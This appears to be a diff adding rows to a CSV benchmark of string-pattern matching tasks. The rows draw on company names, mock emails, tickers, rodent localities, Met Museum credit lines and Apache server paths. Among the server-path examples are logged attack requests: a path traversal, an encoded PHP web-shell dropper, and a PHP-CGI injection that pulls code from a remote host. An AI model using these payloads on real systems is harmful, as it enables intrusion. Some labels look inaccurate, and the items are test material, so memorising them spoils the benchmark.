+23,marketing,MARKETING_CAMPAIGN_ACTIVITY,Account,Find business name with at least 3 words,"Kinross Gold Corporation
+Harley-Davidson Motor Company
+Fisheries And Oceans Canada","Hampton
+Kongsberg Maritime
+Columbia Sportswear","Whole Foods Market
+Sunshine Insurance Group
+Spectrum Brands, Inc
+The Corcoran Group
+Hyundai Motor India Ltd
+India Infoline Ltd
+White House Black Market
+Four Seasons Hotels And Resorts
+Gold Coin Capital Market Pvt.Ltd
+Motilal Oswal Financial Services Ltd","Ooredoo Qatar
+Iron Mountain
+Bpifrance
+Ineco
+Hess Corporation
+City Of San Diego
+State Of Hawaii
+Ut Southwestern Medical Center At Dallas
+American Airlines
+City Of Los Angeles",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+24,marketing,MARKETING_CAMPAIGN_ACTIVITY,Account,find format of the style xx of [place],"Insurance Corporation Of British Columbia
+Agricultural Bank Of China
+Government Of Maharashtra","Indian Institute Of Science
+Hospital & Healthcare Brazil
+Virgin Australia","Royal Bank Of Scotland
+Visiting Nurse Service Of New York
+Industrial And Commercial Bank Of China
+Mutual Of Omaha
+Blue Cross Blue Shield Of Michigan
+National Bank Of Egypt
+National Bank Of Canada
+Federal Reserve Bank Of New York
+Corrections Corporation Of America
+National Bank Of Pakistan
+First National Bank Of Omaha","Sun International
+Autonomo
+Perkinelmer, Inc.
+Rockwell Collins
+Mercedes-Benz Usa
+The Whiting-Turner Contracting Company
+Bausch + Lomb
+Eureka Forbes Ltd
+University Of Gothenburg",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+25,salesforce,USER,Email,find those emails that contains number in its username,"jwilletts3@telegraph.co.uk
+ahawkes6w@pinterest.com
+gjellis10@angelfire.com","ratlayb@si.edu
+fborei@domainmarket.com
+rwhalebellyk@so-net.ne.jp","bceaplen5u@rakuten.co.jp
+rcragg6v@wikispaces.com
+tmicallef7l@reddit.com
+arassmann7f@state.tx.us
+ahawkes6w@pinterest.com
+adeverell5j@sitemeter.com
+cconiff7v@state.gov
+naron9z@sun.com
+eroostan8z@cam.ac.uk
+hkirsche1@etsy.com","egynnifx@amazon.co.jp
+ldetheridgefy@google.co.jp
+cpettwoodgh@symantec.com
+nmeinscp@list-manage.com
+aspurwaycx@pinterest.com
+kfranzelam@devhub.com
+dtolchardebn@w3.org
+tgradondg@smh.com.au
+mtookdl@mit.edu
+agerberbq@wisc.edu",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+26,salesforce,USER,Email,find those emails that ends with number in its username and ends with a country domain,"jwilletts3@telegraph.co.uk
+edavenell34@google.nl
+mbresnen5@spiegel.de","twhatley27@who.int
+clynd28@1688.com
+ffilchakov1x@biglobe.ne.jp","jabramowitch68@exblog.jp
+mhowcroftc6@abc.net.au
+cchaster81@ucoz.ru
+ogove40@mail.ru
+mgeorgeonc9@narod.ru
+dferroli41@google.com.br
+gkolushevb1@360.cn
+jedsellb2@ebay.co.uk
+largoa3@yahoo.co.jp
+lpoulsona4@sakura.ne.jp","aewbankaj@slideshare.net
+rhannaway3b@uiuc.edu
+tmccrudden55@linkedin.com
+afeare2i@flavors.me
+fmichieldw@upenn.edu
+fmartellinicu@jugem.jp
+jkubalad8@nytimes.com
+mgazzard54@dell.com
+crickardsson7z@360.cn
+msingsg0@scribd.com",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+27,snowflake_account_usage,QUERY_HISTORY,Release Version,find those version with minor between 10-40 and more than one patches,"5.20.1
+5.40.1
+6.10.2","5.41.1
+6.9.2
+5.22.0","5.37.3
+6.12.1
+5.22.1
+6.12.1
+5.14.3
+5.26.1
+6.13.1
+5.39.1
+5.40.2
+5.29.1","5.38.0
+5.23.0
+5.27.0
+5.45.0
+5.20.0
+5.28.0
+5.46.1
+5.24.0
+5.45.1
+5.44.2",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+28,stocks,INDUSTRIES,Company Name,find those company with 3-letter abbreviation,"The TJX Companies, Inc. (TJX)
+American Express Company (AXP)
+Associated Banc-Corp (ASB)","Plumas Bancorp (PLBC)
+The Children's Place, Inc. (PLCE)
+Pinnacle Foods Inc. (PF)","Booz Allen Hamilton Holding Corporation (BAH)
+Tenneco Inc. (TEN)
+Winnebago Industries, Inc. (WGO)
+Joy Global Inc. (JOY)
+American Financial Group, Inc. (AFG)
+Mueller Industries, Inc. (MLI)
+Simpson Manufacturing Co., Inc. (SSD)
+Gray Television, Inc. (GTN)
+Hertz Global Holdings, Inc. (HTZ)
+Jabil Circuit, Inc. (JBL)","The Liberty SiriusXM Group (LSXM.K)
+Walter Energy, Inc. (WLTG.Q)
+Northwest Indiana Bancorp (NWIN)
+QUALCOMM Incorporated (QCOM)
+CommScope Holding Company, Inc. (COMM)
+1st Constitution Bancorp (FCCY)
+Nutri Pharmaceuticals Research, Inc. (NRPR)
+T-Mobile US, Inc. (TMUS)
+WSFS Financial Corp. (WSFS)
+Puration, Inc. (PURA)",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+29,stocks,INDUSTRIES,Company Name,find those company with abbreviatrion contianing a dot,"Marine Petroleum Trust (MARP.S)
+LCTI Low Carbon Technologies International Inc. (LWCT.F)
+Alabama Aircraft Industries, Inc (AAII.Q)","Sionix Corp. (SINX)
+First Commonwealth Financial Corporation (FCF)
+Altria Group, Inc. (MO)","Motors Liquidation Company GUC Trust (MTLQ.U)
+First Real Estate Investment Trust of New Jersey (FREV.S)
+Pacific WebWorks, Inc. (PWEB.Q)
+The Liberty SiriusXM Group (LSXM.K)
+CohBar, Inc. (COB.U)
+4Licensing Corporation (FOUR.Q)
+Crumbs Bake Shop, Inc. (CRMB.Q)
+Gryphon Gold Corporation (GYPH.Q)
+Republic Airways Holdings Inc. (RJET.Q)
+Hampshire Group, Limited (HAMP.Q)","Sophiris Bio, Inc. (SPHS)
+Stock Yards Bancorp, Inc. (SYBT)
+CES Synergies, Inc. (CESX)
+Mustang Alliances, Inc. (MSTG)
+Clovis Oncology, Inc. (CLVS)
+GlycoMimetics, Inc. (GLYC)
+Guess?, Inc. (GES)
+LightPath Technologies, Inc. (LPTH)
+Health Discovery Corporation (HDVY)
+Cogint, Inc. (COGT)",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+30,,portal_rodents_19772002,locality,find strings of the format {state}; {county}; {detail},"FL; Franklin Co.; Dog Island; bordering large inland marsh between old dump area and the powerstation.
+FL; Franklin Co.; just N of Avenue B in town of Apalachicola.
+Florida; Gulf County; E side of","FL; Bay Co.
+Denkanikota
+New Orleans, La.","FL; Dixie Co.; Shired Island
+FL; Franklin Co.; St.Vincent Island
+FL; Bay Co.; bordering Moccasin Creek at Blue Springs Road bridge, N of Bennett (1.8 mi S of Rte 20)
+FL; Citrus Co.; off US 27 just south of Crystal River
+FL; Bay Co.; outside fence row bordering roadside dep.
+Florida; Leon County; in heavily wooded area, ca 1/2 mile N of entrance to Maclay Gardens State Park, Tallahassee.
+Florida; Leon County; on wooded natural levee by the Apalachicola River, between Jim Woodruff Dam and U.S. Rt. 90 bridge, E of Sneads.
+FL; Franklin Co.; Apalachicola National Estuarine Sanctuary; near the Marshall House on bayside of island.
+FL; Palm Beach Co.; swamp in the Daggerwing Nature Center of South County Regional Park west of Boca Raton
+FL; Leon Co.; Elinor Klapp-Phipps Park (W of Meridian Rd, N of Tallahassee)
+FL; Franklin Co.; Apalachicola National Estuarine Sanctuary; near the Marshall House on bayside of island.","(Camporee Field) at Wallwood Boy Scout Reservation on Ocklawaha Arm of Lake Talquin, ca. 10 air mi S of Quincy.
+road to St. Mark's lighthouse; St. Mark's Wildlife Refuge.
+Trib of Meadow Creek, FS Rd 443 2.6 mi S of FS Rd 223, Nez Perce National Forest
+shore of Lake Jackson; North of Tallahassee.
+Green Rd.; SW 1/4 of NW 1/4 Sec 6, T2N R4E
+3.5 miles north of Allicance Cross Road on Fla. Rt. 71.
+Florida; ; Floating in Withlachoochee River at Istachatta, Florida.
+FL, Jefferson County, Wacissa Spring
+3.5 miles north of Allicance Cross Road on Fla. Rt. 71.
+St. Vincent Island, wet swale",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+31,,portal_rodents_19772002,locality,find strings containing {int} miles {Direction} of {Road},"Upper Hoh Rd 8.3 mi E of US 101
+FS Rd 443 0.8 mi S of Selway River Rd, Nez Perce National Forest
+FL; Hernando Co.; US 41 2 miles N of Brooksville","FL; Bay Co.; outside fence row bordering roadside dep.
+near Lake Lindsey
+FL; Dixie Co.; Shired Island","FL; Bay Co.; bordering Moccasin Creek at Blue Springs Road bridge, N of Bennett (1.8 mi S of Rte 20)
+FL; Franklin County; 1 mi E of Highway 319 at terminus of C-370
+Slate Creek Rd 10.2 mi E of US 95, Nez Perce National Forest
+FL; Alachua County; 0.2 miles east of Hwy 121 (SW 34th Street)
+FS Rd 25 4.6 mi S of FS Rd 300, Gifford Pinchot National Forest
+Swampy woodland 2 miles E of Tallahassee
+FS Rd 443 2.6 mi S of FS Rd 223, Nez Perce National Forest
+Fla. Rt. 71 3.5 miles north of Allicance Cross Road
+FL; Pasco County; 2 Miles east of US 75
+Burgdorf Rd 12.4 mi NW of Warren Wagon Rd","Florida; Leon County; near human habitation but in old hardwood forest with much beech and magnolia in ravine; on Ireland property near the Indian Mounds near Lake Jackson.
+FL; Dixie Co.; Shired Island
+FL; Lee Co.; hammock forest; west of Bonita Beach.
+Eagle Mountain Trailhead, Clearwater National Forest
+FL; Franklin Co.; just N of Avenue B in town of Apalachicola.
+FL; Leon Co.; Elinor Klapp-Phipps Park (W of Meridian Rd, N of Tallahassee)
+Florida; Leon County; in heavily wooded area, ca 1/2 mile N of entrance to Maclay Gardens State Park, Tallahassee.
+FL; Franklin Co.; Apalachicola National Estuarine Sanctuary; near the Marshall House on bayside of island.
+FL; Palm Beach Co.; Sand pine scrub just W of DuBois Park on south side of Jupiter Inlet. Naturalized.
+FL; Bay Co.; pasture; just E of Rte 77 on N side of Southport; T2S, R14W, NE1/4 SE1/4 Sec 21",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+32,,portal_rodents_19772002,locality,find strings that are either in forest or in park,"Gifford Pinchot National Forest
+1/2 mile N of entrance to Maclay Gardens State Park, Tallahassee
+Split Creek Trail, Nez Perce National Forest","Upper Hoh Rd 8.3 mi E of US 101
+at Waikamoi trail, Maui, Hawaii
+off US 27 just south of Crystal River","Florida; Lee County; Caloosahatchee Regional Park
+FL; Leon Co.; Elinor Klapp-Phipps Park
+Nez Perce National Forest
+Trib of Meadow Creek, Nez Perce National Forest
+Swamp in the Daggerwing Nature Center of South County Regional Park
+Slate Creek Rd 10.2 mi E of US 95, Nez Perce National Forest
+near Red River Hotsprings, Nez Perce National Forest
+Florida; Alachua County; Mixed hardwood forest
+Canyon Creek Trailhead, Clearwater National Forest
+FL, Jefferson County, Wacissa Spring","Florida; Brevard County; Erna Nixon Hammock; property owned by Melbourne Village.
+Burgdorf Rd 12.4 mi NW of Warren Wagon Rd
+near Lake Lindsey.
+FL; Wakulla Co.; woods; sect 7, T4S, R3W, Tallahassee meridian; 30 mi. sw Tallahassee.
+FL; Hernando Co.; Along US 41, 2 miles n. of Brooksville; low, grazed meadow at Croom Road; fence row along US 41.
+Florida; Jefferson County; by E edge of West Lake Rd.; near NE shore of Lake Miccosukee; 1.6 mi. S of jctn. with paved Green Rd.; SW 1/4 of NW 1/4 Sec 6, T2N R4E
+road to St. Mark's lighthouse; St. Mark's Wildlife Refuge.
+Florida; Leon County; on wooded natural levee by the Apalachicola River, between Jim Woodruff Dam and U.S. Rt. 90 bridge, E of Sneads.
+FL; Highlands Co.; near parking area and nature trail at Archbold Biological Research Station, ca. 6 air mi S of Lake Placid. T38S, R30E, SE1/4 of SE1/4 Sec 7.
+Florida; Pasco County; Just west of Blanton on FLA 41, ca. 2 miles east of US 75",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+33,,portal_rodents_19772002,locality,find strings that are either in lake or river,"near Lake Lindsey
+on the shore of Lake Jackson
+trib of Meadow Creek","Gifford Pinchot National Forest
+N of Avenue B in town of Apalachicola
+Caloosahatchee Regional Park","South of Crystal River
+near Wacissa Spring
+on wooded natural levee by the Apalachicola River
+bordering Moccasin Creek at Blue Springs Road bridge
+Big Slough Branch of Whiskey George Creek
+Withlachoochee River at Istachatta, Florida
+floodplain of Cow Creek Landing
+Ireland property near Lake Jackson
+Ocklawaha Arm of Lake Talquin","Just west of Blanton on FLA 41
+in lowland woods and around clearings of bay forests
+Mixed hardwood forest next to Williston Rd
+Dunes, Anna Maria Key
+Swampy woodland
+Erna Nixon Hammock
+in heavily wooded area
+Copalinga Private Reserve-red trail (1420m)
+Elinor Klapp-Phipps Park",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+34,,portal_rodents_19772002,locality,find strings that are ~<10mi from a road,"1.6 mi. S of Green Rd
+Upper Hoh Rd 10.2 mi E of US 101
+FS Rd 25 4.6 mi S of FS Rd 300","20 mi N of Kojonup
+Between highway 98 and the river opposite 3rd Street W in Carrabelle
+near Red River Hotsprings, Nez Perce National Forest","0.2 mi. east of Hwy 121
+1.8 mi S of Rte 20
+FS Rd 443 0.8 mi S of Selway River Rd
+1 mi SW of intersection with Old Coast Road
+FS Rd 443 2.6 mi S of FS Rd 223
+3.5 mi north of Allicance Cross Road
+4.5 mi S of town of Sopchoppy
+Slate Creek Rd 8.3 mi E of US 95","30 mi. SW Tallahassee
+US 27 just south of Crystal River
+East of taxiways at McCoy Field, Orlando
+Florida; Dade County; in Miami Beach
+swamp in the Daggerwing Nature Center of South County Regional Park west of Boca Raton
+weedy vacant waterfront lot, Key West.
+Floating in Withlachoochee River at Istachatta, Florida.
+6 mi S of Lake Placid
+1/2 mi. N of entrance to Maclay Gardens State Park
+US 41 2 mi N of Brooksville",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+35,,server,path,find those apache log with id more than 151000,"/apache-log/access_151005.log
+/apache-log/access_151225.log
+/apache-log/access_151111.log","/apache-log/access_150122.log
+/apache-log/access.log.41.gz
+/apache-log/error.log.34.gz","/apache-log/access_160103.log
+/apache-log/access_151224.log
+/apache-log/access_151022.log
+/apache-log/access_151118.log
+/apache-log/access_151126.log
+/apache-log/access_151109.log
+/apache-log/access_151120.log
+/apache-log/access_151104.log
+/apache-log/access_151024.log
+/apache-log/access_151207.log","/apache-log/access_150528.log
+/apache-log/access_150930.log
+/apache-log/access_150905.log
+/components/com_hdflvplayer/hdflvplayer/download.php?f=../../../configuration.php
+/apache-log/access_150624.log
+/apache-log/access_150917.log
+/apache-log/access_150901.log
+/apache-log/access_150711.log
+/apache-log/access_150619.log
+/apache-log/access_150523.log",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+36,,server,path,find those apache log with id more than 151000 or log with gz that is less than 50,"/apache-log/access_151005.log
+/apache-log/access.log.50.gz
+/apache-log/access_151226.log","/apache-log/access_150905.log
+/apache-log/index.php?option=com_search
+/apache-log/error.log.51.gz","/apache-log/access_151120.log
+/apache-log/access_151028.log
+/apache-log/access_151214.log
+/apache-log/access_151024.log
+/apache-log/access.log.17.gz
+/apache-log/access_151101.log
+/apache-log/error.log.6.gz
+/apache-log/access.log.39.gz
+/apache-log/access_160104.log
+/apache-log/access_151212.log","/apache-log/access_150113.log
+/apache-log/error.log.88.gz
+/apache-log/error.log.67.gz
+/apache-log/access.log.80.gz
+/apache-log/access_150120.log
+/apache-log/access.log
+/apache-log/error.log.84.gz
+/apache-log/access.log.47.gz
+/apache-log/error.log.70.gz
+/apache-log/error.log.55.gz",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+37,,server,path,find thsoe strings that are aty least 3 directory deep,"/images/phocagallery/thumbs/phoca_thumb_m_winterfoto%2017.jpg
+/images/stories/explore.php?baca
+/administrator/templates/khepri/images/j_crn_tr_light.png","/apache-log/access_150323.log
+/_DB_.sql.zip
+/components_com_content/metadata.xml","/components/com_hdflvplayer/hdflvplayer/download.php?f=../../../configuration.php
+/images/phocagallery/almhuette/thumbs/phoca_thumb_l_zimmer.jpg
+/modules/mod_bowslideshow/tmpl/images/image_shadow.png
+/administrator/components/com_maianmedia/utilities/charts/php-ofc-library/ofc_upload_image.php
+/media/editors/tinymce/skins/lightgray/img/thumb.php
+/components/com_phocagallery/assets/js/shadowbox/src/lang/shadowbox-en.js
+/administrator/templates/khepri/favicon.ico
+/modules/mod_bowslideshow/tmpl/images/right.png
+/administrator/components/com_redmystic/chart/ofc-library/ofc_upload_image.php
+/images/stories/raith/garage.jpg","/www.almhuette-raith.at.sql
+/imagesstories/magic.php.png?baca
+/?1=%40ini_set%28%22display_errors%22%2C%220%22%29%3B%40set_time_limit%280%29%3B%40set_magic_quotes_runtime%280%29%3Becho%20%27-%3E%7C%27%3Bfile_put_contents%28%24_SERVER%5B%27DOCUMENT_ROOT%27%5D.%27/images/al277.php%27%2Cbase64_decode%28%27PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8%2B%27%29%29%3Becho%20%27%7C%3C-%27%3B
+/index.php?option=com_phocagallery&view=category&id=3:almhuette-raith&Itemid=53
+/index.php?Itemid=55&id=49&option=com_content&view=article
+/images/image.php
+//index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&version=1576&cid=20
+ /www.almhuette-raith.at.sql
+/index.php?option=com_phocagallery&view=category&id=1&Itemid=53&limitstart=20
+/modules/mod_mapsgoogle/mod_mapsgoogle.php",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+38,,server,path,php files,"/CHANGELOG.php
+/images/maink.php
+/apache-log/images/stories/petx.php","/access
+/?-d%20allow_url_include%3DOn+-d%20auto_prepend_file%3Dhttp://demo.exent.it/egoitaliano///media/r.txt
+/images/stories/raith/oststeiermark.png","/index.php?option=com_content&view=article&id=46&Itemid=54
+/apache-log/images/stories/magic.php
+/images/404.php
+/configuration.php
+/libraries/image-import.php
+//cfg-contactform-6/inc/upload.php
+/administrator/index.php
+/images/cachefix.php
+/tmp/kurd.php
+/configuration.php-dist","/components/com_phocagallery/assets/phocagallery.css
+/apache-log/access_151019.log
+/apache-log/?M=A
+/images/stories/raith/wohnung_1_web.jpg
+/images/stories/raith/almhuette_raith.jpg
+/apache-log/error.log.8.gz
+/images/stories/raith/wohnung_2_web.jpg
+/index.php?option=com_phocagallery&view=category&id=3:almhuette-raith&Itemid=0
+/images/stories/slideshow/almhuette_raith_01.jpg
+/apache-log//images/stories/create.gif",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+39,,server,path,photos with number in its name,"/images/phocagallery/thumbs/phoca_thumb_l_winterfoto%204.jpg
+/photos/apple-touch-icon-114x114-precomposed.png
+/images/stories/raith/wohnung_2_web.jpg","/apache-log/access_150217.log
+/index.php?option=com_phocagallery&view=category&id=1&itemid=53
+/images/phocagallery/almhuette/thumbs/phoca_thumb_m_grillplatz.jpg","/images/phocagallery/almhuette/thumbs/phoca_thumb_l_almhuette_raith_009.jpg
+/images/phocagallery/almhuette/thumbs/phoca_thumb_l_almhuette_raith_004.jpg
+/images/phocagallery/thumbs/phoca_thumb_l_winterfoto%2023.jpg
+/images/phocagallery/almhuette/thumbs/phoca_thumb_m_almhuette_raith_006.jpg
+/images/phocagallery/almhuette/thumbs/phoca_thumb_l_almhuette_raith_006.jpg
+/images/phocagallery/almhuette/thumbs/phoca_thumb_m_almhuette_raith_014.jpg
+/images/phocagallery/almhuette/thumbs/phoca_thumb_l_almhuette_raith_001.jpg
+/images/phocagallery/Ferienwohnung_2/thumbs/phoca_thumb_l_3_wohnkche1.jpg
+/images/phocagallery/Ferienwohnung_2/thumbs/phoca_thumb_m_4_schlafzimmer.jpg
+/administrator/templates/khepri/images/j_button1_left.png","/modules/mod_bowslideshow/tmpl/images/right.png
+/images/phocagallery/almhuette/thumbs/phoca_thumb_m_jaegerzaun_gr.jpg
+/templates/jp_hotel/images/bullet.gif
+/administrator/templates/khepri/images/notice-alert.png
+/images/phocagallery/almhuette/thumbs/phoca_thumb_l_garage.jpg
+/index.php?option=com_phocagallery&view=category&id=2:winterfotos&Itemid=0
+/administrator/templates/khepri/images/h_green/j_header_right.png
+/images/phocagallery/almhuette/thumbs/phoca_thumb_l_zimmer.jpg
+/components/com_phocagallery/assets/js/shadowbox/src/skin/classic/icons/next.png
+/components/com_phocagallery/assets/images/shadow1.gif",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+40,,met,Credit Line,Gift from two people after 2000,"Gift of Thomas and Mona Tourlentes, 2000
+Gift of Sylvan Barnet and William Burto, in honor of Saretta and Howard Barnet, 2014
+Gift of Tobias Meyer and Mark Fletcher, 2020","Gift of Joan Washburn, 2017
+Gift of Victoria and Iain Nasatir, 1984
+Purchase, Whittelsey Fund, 1960","Gift of The Jerry and Emily Spiegel Family Foundation, 2007
+Gift of Eileen and Michael Cohen, 2008
+Gift of Susan and Fredrick Orkin, 2014
+Gift of Janis Conner & Joel Rosenkranz, NY, 2018
+Gift of Alfred and Lisl Greenberg, 2016
+Gift of Patricia Pastor and Barry Friedman, 2012
+Gift of Edward Pearce Casey and Carolyn H. Specht, 2016
+Gift of Thomas and Gianna Le Claire, 2010
+Gift of Craig and Elizabeth Zamiello, 2019
+Gift of Harold Koda and Alan Kornberg, 2001","Gift of E. Mortimer Newlin, 1964
+Brooklyn Museum Costume Collection at The Metropolitan Museum of Art, Gift of the Brooklyn Museum, 2009; Gift of Charles James, 1951
+Purchase, Mobil Foundation Inc. Gift; Sheikh Nasser Sabah al-Ahmed al-Sabah Gift, in memory of Richard Ettinghausen, 1980
+Gift of the Estate of Marcia Brady Tucker, 1990
+Purchase, The Abraham Foundation Inc., David L Klein Jr. Memorial Foundation Inc. and Gawain McKinley Gifts, 1985
+Purchase, 2017 Benefit Fund; Lila Acheson Wallace Gift; Mary Trumbull Adams and Victor Wilbour Memorial Funds; Friends of European Paintings and Henry and Lucy Moses Fund Inc. Gifts; Gift of Julia A. Berwind, by exchange; Charles and Jessie Price, Otto Naumann, Mr. and Mrs. Richard L. Chilton Jr., and Sally and Howard Lepow Gifts; Charles B. Curtis Fund; and Theodocia and Joseph Arkus Gift, 2017
+The Rubel Collection, Purchase, Lila Acheson Wallace, Anonymous, Joyce and Robert Menschel, Jennifer and Joseph Duke, and Ann Tenenbaum and Thomas H. Lee Gifts, 1997
+Gift of Famille de Bayser in honor of George Goldner, 2021
+Purchase, Rogers Fund and Gift of Mrs. Benjamin Knower, Bequest of Ogden Mills, and Bequest of Collis P. Huntington, by exchange, 1949
+Purchase, Anne Murray Gift, in memory of Rita C. Murray, 1994",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+41,,met,Credit Line,Gift from some institution before 2000,"Gift of University of Virginia Drama Department, 1977
+Gift of The Art Institute of Chicago, 1990
+Friends of The Costume Institute Gifts, 1980","Gift of Mrs. Otto H. Bacher, 1938
+Friends of The Costume Institute Gifts, 2016
+Gift of Kohler Foundation, Inc. in collaboration with the Kansas City Art Institute, 2017","Gift of Tiffany & Co., 1985
+Gift of Steuben Glass Inc., 1949
+Gift of Cooper Union Museum for the Arts of Decoration, 1949
+Gift of School Art League of New York City, 1924
+Gift of The Museum of the City of New York, 1944
+Gift of The British School of Archaeology in Egypt, 1913
+Gift of The French Institute Library, 1950
+Gift of The Institute of Archaeology, The University of London, 1951
+Gift of Teachers College, Columbia University, 1959
+Gift of The Fashion Group Inc., 1975","Purchase, Lila Acheson Wallace Gift, 1986
+Gift of Mr. and Mrs. Warren Brandt, 1984
+Gift of the George Eastman House, 1959
+Gift of Bettina Ballard, 1958
+Gift of Lewis Einstein, 1964
+The Elisha Whittelsey Collection, The Elisha Whittelsey Fund, 1929
+Gift of Eric N. Shrubsole, 1969
+Gift of Denis Gallion and Daniel Morris, 1991
+Gift of Mrs. William Rhinelander Stewart, 1976
+Gift of Miss Adelaide Milton de Groot, in memory of her sister, the Countess Caravadossa d'Aspremonte",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+42,,met,Credit Line,Purchase made by using 3 different funds,"Purchase, Richard S. Perkins Gift, Patti Birch Gift, and Ehsan Yarshater Gift, 1993
+Purchase, Arthur Ochs Sulzberger Gift, and Rogers Acquisitions and Fletcher Funds, 2016
+Purchase, Friends of Drawings and Prints Gifts, and Ian Woodner Family Collection and Mr. and Mrs. Francis D. Logan Funds, 2019","Purchase, Bequest of Mary Cushing Fosburgh and Gift of Rodman Wanamaker, 1982
+The Michael C. Rockefeller Memorial Collection, Gift of Mr. and Mrs. John J. Klejman, 1960
+Purchase, Gift of Mrs. Ridgely Hunt, by exchange, 1939","Purchase, Rogers Fund, Louis E. and Theresa S. Seley Purchase Fund for Islamic Art, and The Page and Otto Marx Jr. Foundation Gift, 2003
+Purchase, Rogers Fund, and Mr. and Mrs. Isaac D. Fletcher Collection, Bequest of Isaac D. Fletcher, 1943
+Purchase, Florence B. Selden Bequest and Rogers Fund, and Promised Gift of Leon D. and Debra R. Black, 2000
+Purchase, Rogers Fund, Louis E. and Theresa S. Seley Purchase Fund for Islamic Art, and Mrs. Charles D. Kelekian Gift, 1994
+Purchase, Nancy and Edwin Marks, Joyce and Robert Menschel, and Harriette and Noel Levine Gifts, 1994
+Purchase, Karen B. Cohen Gift, Harry G. Sperling Fund, and Bequest of Clifford A. Furst, 1995
+Purchase, Bashford Dean Bequest, James Elwood Jones Jr. Gift, and Rogers and Fletcher Funds, 1974
+Purchase, The Overbrook Foundation, Robert and Bobbie Falk Philanthropic Fund, and Lois and Arthur Stainman Philanthropic Fund Gifts, 1999
+Purchase, Walter and Leonore Annenberg Acquisitions Endowment Fund, Rosetta Larsen Trust Gift, and Friends of European Sculpture and Decorative Arts Gifts, 2009
+Purchase, Gift of George Blumenthal, Elaine Rosenberg and Austin B. Chinn Gifts, and Bequest of Fannie F. Einstein, 2007","Purchase, The Charles Engelhard Foundation Gift, 1991
+Gift of Mrs. Manfred P. Welcher, 1918
+The Muriel Kallis Steinberg Newman Collection, Gift of Muriel Kallis Newman, 2006
+Purchase, Wrightsman Fellows Gifts, 2019
+Gift of Michal and Ilse McClure, and David Thomas, recording producer, 2010 
+Gift of The Isaacson-Draper Foundation, 2011
+Purchase, Louis and Bessie Adler Foundation Inc. Gift, 1986 (Seymour M. Klein, President)
+Purchase, Friends of Drawings and Prints and Krugman Family Foundation Gifts, 2019
+Gift of Charles Kleibacker, 2002
+Gift of Mrs. Helen G. Sahler, 1939",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+43,,met,Artist Display Bio,"Two artists, both born in 14th century","Italian, Florence 1555-1630 Rome|Dutch, Amsterdam 1586-1652 Amsterdam
+French, Mantes-sur-Seine 1598-1642 Paris|French, Tours 1593-1670 Paris
+Netherlandish, Duffel 1573-1650 Amsterdam|Netherlandish, Hoorn 1533-1578 Rome","French, Troyes 1610-1686 Paris|French, Rouen 1600-1668 Paris|Italian, Rome 1500-1546 Mantua
+Argentine, Buenos Aires 1937-2016 Buenos Aires
+French, Troyes 1610-1686 Paris|Italian, Mantua 1635-1688 Rome","German, Nuremberg 1585-1628 Rome|French, Paris 1590-1649 Paris
+Italian, Verona 1537-1586 Verona|Italian, Parma 1503-1540 Casalmaggiore
+Italian, Bologna 1562-1602 Bologna|Italian, Bologna 1560-1609 Rome
+Italian, Rome, 1585-1615, Rome|Italian, Siena 1563-1610 Siena
+Italian, Verona 1528-1588 Venice|Netherlandish, Bruges 1523-1605 Florence
+French, 1540-50|Italian, Parma 1503-1540 Casalmaggiore
+French, Mantes-sur-Seine 1598-1642 Paris|French, Tours 1593-1670 Paris
+Italian, 1750-74|Italian, Cortona 1596-1669 Rome
+Flemish, Antwerp 1593-1678 Antwerp|Flemish, Antwerp 1593-1678 Antwerp
+Netherlandish, Leiden 1556-1629 Brussels|Italian, Florence 1555-1630 Rome","French, Paris 1751-1832 Paris
+French, Paris 1804-1876 Nohant|French, Paris 1851-1936|French, Paris 1849-1911 Paris|Paris
+French, Paris, active mid-17th century|French, born ca. 1630|French, Paris, active mid-17th century
+British, 1770-1834|British, London 1789-1856 London|British, active 1830s
+American, first half 20th century|American, first half 20th century|American
+American, 19th century|Hartford, Connecticut|American, Florida, Missouri 1835-1910 Hartford, Connecticut|American, 19th century
+French, Paris 1694-1752 Paris|French, Paris 1674-1749 Paris
+Dutch, active 1619-1707|Dutch, Amsterdam 1643-1693 Amsterdam|Dutch, Amsterdam 1648-1709 Amsterdam
+Italian, Florence 1386-1466 Florence
+Japanese, 1761–1816",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+44,,met,Artist Display Bio,Find entries with artists from european countries,"French, 1623-1676|Munich, 1660-1690
+French, 1803-1847|French, 1838|French, 1813-1883
+German, 1932","American, 1786-1877|American, 19th century
+Chinese, 1823-1901
+American, 1834-1903|Australian, 1855-1938","German, active 16th century|British, 18th century
+Austrian, 1956
+French, 1719-1781|British, 1736-1811|British, 1758-1794|French, 1714-1788|French, 1712-1784|French, 1662-1693
+French,1923|French, 1905-1957
+French, 1900
